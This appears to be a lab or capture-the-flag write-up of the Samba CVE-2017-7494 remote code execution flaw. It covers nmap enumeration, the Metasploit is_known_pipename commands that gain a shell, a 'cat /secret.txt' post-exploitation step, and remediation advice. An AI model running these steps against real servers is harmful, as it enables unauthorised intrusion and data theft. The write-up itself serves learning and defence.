# Samba 3.5.0 - 4.6.4 Remote Code Execution

## Summary

| Field | Detail |
|-------|--------|
| **CVE** | CVE-2017-7494 |
| **Affected Version** | Samba 3.5.0 - 4.6.4 |
| **Attack Vector** | Network (SMB) |
| **Impact** | Remote Code Execution |

## Description

Samba versions 3.5.0 through 4.6.4, 4.5.10, and 4.4.14 are vulnerable to a remote code execution attack via the `is_known_pipename()` function. An attacker with write access to an SMB share can upload a shared library and cause the server to load and execute it, resulting in arbitrary code execution with the privileges of the Samba service.

## Enumeration

```bash
nmap -sV -sC TARGET_IP
```

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 8.4p1 Debian |
| 445 | SMB | Samba smbd 4.6.3 |

SMB OS discovery identified the target as `Samba 4.6.3` with workgroup `WORKGROUP`.

## Exploitation

**Module:** `exploit/linux/samba/is_known_pipename`

```bash
msf6 > use exploit/linux/samba/is_known_pipename
msf6 > set RHOSTS TARGET_IP
msf6 > run
```

The module discovered a writable share (`myshare` at `/home/share`), uploaded a malicious shared library (`.so` file), and loaded it via a named pipe to obtain a command shell session.

**Post-exploitation:**

```bash
cat /secret.txt
```

## Remediation

| Action | Priority |
|--------|----------|
| Update Samba to >= 4.6.4 / 4.5.10 / 4.4.14 | Critical |
| Set `nt pipe support = no` in smb.conf | Critical |
| Restrict writable shares to authenticated users | High |
| Apply network-level access controls to port 445 | High |

## References

- [CVE-2017-7494 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2017-7494)
- [Samba Security Release](https://www.samba.org/samba/security/CVE-2017-7494.html)
